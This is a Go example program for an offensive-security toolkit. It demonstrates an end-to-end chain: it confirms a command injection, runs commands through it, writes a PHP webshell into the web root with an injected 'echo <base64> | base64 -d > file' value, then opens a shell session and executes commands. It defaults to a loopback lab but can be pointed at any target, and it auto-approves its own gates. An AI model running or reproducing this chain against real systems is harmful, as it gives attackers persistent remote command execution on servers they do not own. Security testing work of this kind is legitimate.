// Command webshell-chain demonstrates the M2 chain end to end: a confirmed
// command-injection point becomes a session you can run commands in.
//
//	cmdi_probe      the injection point echoes a unique marker back
//	cmdi_execute    run a real command through it (id)
//	webshell_deploy write a shell through the same primitive
//	session_open    register the dropped shell as a webshell session
//	session_exec    run id inside that session
//
// It runs against a local in-process target (examples/lab) that binds to
// loopback only. Point it at the real PHP container described in STATE.md with
//
//	go run ./examples/webshell-chain -base http://127.0.0.1:PORT -dir /path/to/webroot
//
// Nothing in this example reaches the network beyond loopback.
package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/c1ayooo/capkit/adapters/auditlog"
	"github.com/c1ayooo/capkit/adapters/httpx"
	"github.com/c1ayooo/capkit/adapters/settings"
	"github.com/c1ayooo/capkit/all"
	"github.com/c1ayooo/capkit/core"
	"github.com/c1ayooo/capkit/examples/lab"
	"github.com/c1ayooo/capkit/gates"
	"github.com/c1ayooo/capkit/kits/sessionkit"
	"github.com/c1ayooo/capkit/kits/shellkit"
	"github.com/c1ayooo/capkit/kits/shellkit/session"
	"github.com/c1ayooo/capkit/runtime"
)

func main() {
	base := flag.String("base", "", "target base URL; default: the local in-process lab")
	dir := flag.String("dir", "", "target web root; default: the local lab's temp dir")
	keep := flag.Bool("keep", false, "keep the local lab's web root for inspection")
	flag.Parse()

	ctx := context.Background()
	cc := core.CallContext{ProjectID: 1, Actor: "webshell-chain-example"}

	// ---- the target: either the local fixture or a real web root ----
	var target, webroot string
	if *base != "" {
		target, webroot = *base, *dir
		if webroot == "" {
			log.Fatal("-dir is required when -base points at a real web root")
		}
	} else {
		l, err := lab.New()
		if err != nil {
			log.Fatal(err)
		}
		defer func() {
			if *keep {
				fmt.Printf("lab web root kept at %s\n", l.Dir)
				return
			}
			l.Close()
		}()
		target, webroot = l.BaseURL(), l.Dir
	}
	execURL := target + "/exec.php"
	fmt.Printf("target: %s\nwebroot: %s\n\n", target, webroot)

	// ---- the host wiring: gates + a gate-aware transport + a session manager ----
	scope := gates.StaticScope(hostOf(target))
	limiter := gates.NewLimiter()
	audit := auditlog.NewMemory()
	httpDoer := httpx.New(scope, limiter, audit)

	// The host supplies the delivery channel. This one writes through the same
	// command-injection primitive the probe confirmed, which is exactly the
	// "vulnerability -> foothold" step the chain is about.
	deployer := &cmdDeployer{http: httpDoer, dir: webroot, url: execURL}

	manager := sessionkit.NewManager(nil, nil)
	executor := &httpExecutor{http: httpDoer, dir: webroot, base: target}
	if err := all.RegisterWebShellOpener(manager, executor); err != nil {
		log.Fatal(err)
	}

	reg := core.NewRegistry()
	for _, add := range []func(*core.Registry) error{
		all.RegisterExploit, all.RegisterHTTP,
		func(r *core.Registry) error { return all.RegisterSessionWithDeployer(r, deployer) },
	} {
		if err := add(reg); err != nil {
			log.Fatal(err)
		}
	}
	rt, err := runtime.New(runtime.Config{
		Scope: scope, Approval: gates.AutoApprove(), Limiter: limiter, Audit: audit,
		HTTP: httpDoer, Settings: settings.New(nil), Sessions: manager,
	}, reg)
	if err != nil {
		log.Fatal(err)
	}

	step := func(n int, title string) {
		fmt.Printf("\n== %d. %s ==\n", n, title)
	}

	// ---- 1. probe ----
	step(1, "cmdi_probe: does this point execute commands?")
	probeInput, _ := json.Marshal(map[string]any{
		"point": map[string]any{
			"url": execURL, "param": "ip", "location": "query", "value": "127.0.0.1",
		},
		"marker": "example_cmdi_marker",
	})
	probe := call(rt, ctx, cc, "cmdi_probe", probeInput)
	fmt.Println("status:", probe.Status, "| summary:", probe.Summary)
	// A confirmed probe reports its working payload in Findings (docs §5.4), and
	// cmdi_execute requires exactly that proven template — the chain stays honest
	// about what was demonstrated rather than re-deriving a payload.
	if len(probe.Findings) == 0 || !probe.Findings[0].Confirmed {
		fatal("the probe did not confirm execution: %s", probe.Summary)
	}
	template := deriveTemplate(probe.Findings[0].Payload)
	fmt.Println("confirmed with payload:", probe.Findings[0].Payload)
	fmt.Println("execution template:", template)

	// ---- 2. execute a real command through the confirmed point ----
	step(2, "cmdi_execute: run id through the confirmed point")
	execInput, _ := json.Marshal(map[string]any{
		"point": map[string]any{
			"url": execURL, "param": "ip", "location": "query", "value": "127.0.0.1",
		},
		"template": template,
		"command":  "id",
	})
	ran := call(rt, ctx, cc, "cmdi_execute", execInput)
	fmt.Println("status:", ran.Status, "| summary:", ran.Summary)
	if ran.Status != core.StatusSuccess {
		fatal("cmdi_execute failed: %s", ran.Summary)
	}
	// The response body deliberately does not ride in Data (docs §5.5.4); it is
	// stored as evidence and Data carries a reference. The preview is where the
	// proof shows up.
	proof := evidencePreview(ran)
	fmt.Println("response preview:", firstLines(proof, 3))
	if !strings.Contains(proof, "uid=") {
		fatal("cmdi_execute did not return a real id output: %q", proof)
	}

	// ---- 3. drop a shell ----
	step(3, "webshell_deploy: write a shell through the same primitive")
	deployInput, _ := json.Marshal(map[string]any{
		"target": execURL, "shell_type": "php", "watermark": "example-chain",
	})
	dropped := call(rt, ctx, cc, "webshell_deploy", deployInput)
	fmt.Println("status:", dropped.Status, "| summary:", dropped.Summary)
	if dropped.Status != core.StatusSuccess {
		fatal("webshell_deploy failed: %s / %+v", dropped.Summary, dropped.Error)
	}
	var dropData struct {
		FileURL  string `json:"file_url"`
		Filename string `json:"filename"`
		WebShell struct {
			Host    string            `json:"host"`
			Secret  string            `json:"secret"`
			Options map[string]string `json:"options"`
		} `json:"webshell"`
		Cleanup struct {
			Command string `json:"command"`
		} `json:"cleanup"`
	}
	if err := json.Unmarshal(dropped.Data, &dropData); err != nil {
		fatal("deploy data: %v", err)
	}
	fmt.Println("dropped:", dropData.FileURL)
	fmt.Println("cleanup:", dropData.Cleanup.Command)

	// ---- 4. take over the session ----
	step(4, "session_open(kind=webshell): register the dropped shell")
	openInput, _ := json.Marshal(map[string]any{
		"kind":   "webshell",
		"host":   dropData.WebShell.Host,
		"secret": dropData.WebShell.Secret,
		"options": map[string]string{
			"shell_type": dropData.WebShell.Options["shell_type"],
			"cmd_param":  dropData.WebShell.Options["cmd_param"],
			"pass_param": dropData.WebShell.Options["pass_param"],
		},
	})
	opened := call(rt, ctx, cc, "session_open", openInput)
	fmt.Println("status:", opened.Status, "| summary:", opened.Summary)
	if opened.Status != core.StatusSuccess {
		fatal("session_open failed: %s / %+v", opened.Summary, opened.Error)
	}
	var openData struct {
		SessionID string `json:"session_id"`
	}
	if err := json.Unmarshal(opened.Data, &openData); err != nil {
		fatal("open data: %v", err)
	}

	// ---- 5. run a command in the session ----
	step(5, "session_exec: run id inside the session")
	execIn, _ := json.Marshal(map[string]any{
		"session_id": openData.SessionID, "command": "id",
	})
	inSession := call(rt, ctx, cc, "session_exec", execIn)
	fmt.Println("status:", inSession.Status, "| summary:", inSession.Summary)
	if inSession.Status != core.StatusSuccess {
		fatal("session_exec failed: %s", inSession.Summary)
	}
	fmt.Println("output:", firstLines(outputText(inSession), 3))

	// ---- 6. clean up ----
	step(6, "cleanup: remove the dropped file and close the session")
	// The cleanup runs through the foothold itself, so it works against any
	// target (a local dir or a container) without host-side shell access.
	if dropData.Cleanup.Command != "" {
		cleanupIn, _ := json.Marshal(map[string]any{
			"session_id": openData.SessionID, "command": dropData.Cleanup.Command,
		})
		cleaned := call(rt, ctx, cc, "session_exec", cleanupIn)
		fmt.Println("cleanup via session:", cleaned.Status, "|", cleaned.Summary)
	}
	// Verify the file is gone from the target's own point of view.
	verifyURL := dropData.FileURL
	check := probeAnonymous(rt, ctx, cc, verifyURL)
	fmt.Println("after cleanup, GET "+verifyURL+" ->", check)
	if check == 200 {
		fatal("the dropped file survived cleanup")
	}
	closeIn, _ := json.Marshal(map[string]any{"session_id": openData.SessionID})
	closed := call(rt, ctx, cc, "session_close", closeIn)
	fmt.Println("session_close:", closed.Status, "|", closed.Summary)

	fmt.Println("\nchain complete: cmdi_probe -> cmdi_execute -> webshell_deploy -> session_open -> session_exec")
}

// probeAnonymous fetches a URL through the runtime's own gate-aware transport
// with no session, so "is the shell still reachable?" is answered by the target
// rather than by a local filesystem check.
func probeAnonymous(rt *runtime.Runtime, ctx context.Context, cc core.CallContext, url string) int {
	in, _ := json.Marshal(map[string]any{"url": url})
	res, err := rt.Call(ctx, "http_probe", in, cc)
	if err != nil {
		return 0
	}
	if res.Status != core.StatusSuccess {
		fmt.Println("  (probe reported:", res.Summary, ")")
		return 0
	}
	var out struct {
		Status int `json:"status"`
	}
	_ = json.Unmarshal(res.Data, &out)
	return out.Status
}

// ---- host-side collaborators ----

// cmdDeployer writes the shell through the confirmed command-injection point:
// it base64s the payload and redirects it into the web root. A host would do
// this with whatever write primitive the target actually offers (an upload
// form, an LFI log-poisoning route, an SMB write); the point is that the tool
// itself never touches the target.
type cmdDeployer struct {
	http core.HTTPDoer
	dir  string
	url  string
}

func (d *cmdDeployer) Drop(ctx context.Context, req shellkit.WebShellDrop) (*shellkit.WebShellDropResult, error) {
	encoded := base64.StdEncoding.EncodeToString(req.Content)
	target := req.Dir
	if target == "" {
		target = d.dir
	}
	if strings.HasSuffix(target, "/") {
		target += req.Filename
	} else {
		target += "/" + req.Filename
	}
	cmd := fmt.Sprintf("echo %s | base64 -d > %s", encoded, shellQuote(target))
	injected := d.url + "?ip=" + url.QueryEscape("127.0.0.1;"+cmd)
	res, err := d.http.Do(ctx, core.Request{Method: "GET", URL: injected, Timeout: 30 * time.Second})
	if err != nil {
		return nil, err
	}
	if res.Status >= 400 {
		return nil, fmt.Errorf("injection write returned %d", res.Status)
	}
	return &shellkit.WebShellDropResult{
		FileURL: d.url[:strings.LastIndex(d.url, "/")+1] + req.Filename,
		Cleanup: "rm -f " + target,
	}, nil
}

// httpExecutor drives a dropped shell over HTTP through the host's gate-aware
// transport. It is the "host provides the Executor" boundary from shellkit's
// README, wired the way a real host would.
type httpExecutor struct {
	http core.HTTPDoer
	dir  string
	base string
}

func (e *httpExecutor) do(ctx context.Context, s session.Session, query url.Values) (*session.ExecResult, error) {
	u, err := url.Parse(s.URL)
	if err != nil {
		return nil, err
	}
	u.RawQuery = query.Encode()
	res, err := e.http.Do(ctx, core.Request{Method: "GET", URL: u.String(), Timeout: 60 * time.Second})
	if err != nil {
		return nil, err
	}
	return &session.ExecResult{Output: string(res.Body), HTTPStatus: res.Status}, nil
}

func (e *httpExecutor) Exec(ctx context.Context, s session.Session, command string) (*session.ExecResult, error) {
	q := url.Values{"pass": {s.Password}, "op": {"exec"}, "cmd": {command}}
	return e.do(ctx, s, q)
}

func (e *httpExecutor) File(ctx context.Context, s session.Session, op session.FileOp) (*session.ExecResult, error) {
	q := url.Values{"pass": {s.Password}, "op": {"file"}, "action": {op.Action}, "path": {op.Path}}
	return e.do(ctx, s, q)
}

// ---- plumbing ----

func call(rt *runtime.Runtime, ctx context.Context, cc core.CallContext, tool string, input json.RawMessage) core.Result {
	res, err := rt.Call(ctx, tool, input, cc)
	if err != nil {
		fatal("%s: %v", tool, err)
	}
	return res
}

func fatal(format string, args ...any) {
	fmt.Printf("FATAL: "+format+"\n", args...)
	os.Exit(1)
}

// outputText pulls the stdout out of a tool result. session_exec returns it in
// Data; the cmdi tools deliberately do not (their body goes to evidence), which
// is why the example prints the evidence preview for those steps instead.
func outputText(res core.Result) string {
	var d struct {
		Stdout string `json:"stdout"`
	}
	_ = json.Unmarshal(res.Data, &d)
	return strings.TrimSpace(d.Stdout)
}

// evidencePreview returns the stored body's preview, which is the only place a
// tool-returned body surfaces without a separate evidence fetch.
func evidencePreview(res core.Result) string {
	if len(res.Evidence) == 0 {
		return ""
	}
	return res.Evidence[0].Preview
}

// deriveTemplate turns a confirmed probe payload into the {{cmd}} template
// cmdi_execute requires. The probe proves execution with a marker (e.g.
// ";printf marker"), so its payload cannot be reused verbatim — the separator is
// what generalises, and the marker must be replaced by the command.
func deriveTemplate(found string) string {
	if strings.Contains(found, "{{cmd}}") {
		return found
	}
	rest := strings.TrimPrefix(found, "{{value}}")
	if rest == found {
		return "{{value}};{{cmd}}" // the payload did not use the {{value}} slot
	}
	if strings.HasPrefix(rest, "%0a") {
		return "{{value}}%0a{{cmd}}"
	}
	sep := ""
	for _, r := range rest {
		if r == ';' || r == '|' || r == '&' || r == ' ' {
			sep += string(r)
			continue
		}
		break
	}
	if sep = strings.TrimSpace(sep); sep == "" {
		return "{{value}};{{cmd}}"
	}
	return "{{value}}" + sep + "{{cmd}}"
}

func firstLines(s string, n int) string {
	lines := strings.Split(strings.TrimSpace(s), "\n")
	if len(lines) > n {
		lines = lines[:n]
	}
	return strings.Join(lines, "\n    ")
}

func hostOf(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	return u.Hostname()
}

func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}
